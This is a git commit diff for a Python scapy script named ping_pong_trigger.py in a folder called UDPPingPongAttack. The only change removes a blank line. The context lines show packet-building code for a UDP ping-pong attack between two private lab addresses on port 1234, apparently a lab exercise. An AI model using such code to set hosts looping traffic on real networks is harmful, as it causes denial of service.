c691d63283779700d53530df1037497dfa7cb46f
sixelA zeugirdoR <44281620+binexisHATT@users.noreply.github.com>
2020-08-13 19:42:42 -0400

    Update ping_pong_trigger.py

--- UDPPingPongAttack/ping_pong_trigger.py
+++ UDPPingPongAttack/ping_pong_trigger.py
@@ -10,7 +10,6 @@ from scapy.all import *
 
 def trigger_ping_pong_attack():
 	print("[+] Triggering UDP Ping Pong Attack...")
-
 	ip   = IP(src='192.168.33.135', dst='192.168.33.138')
 	udp  = UDP(sport=1234, dport=1234)
 	data = "Let's play some udp ping pong\n"
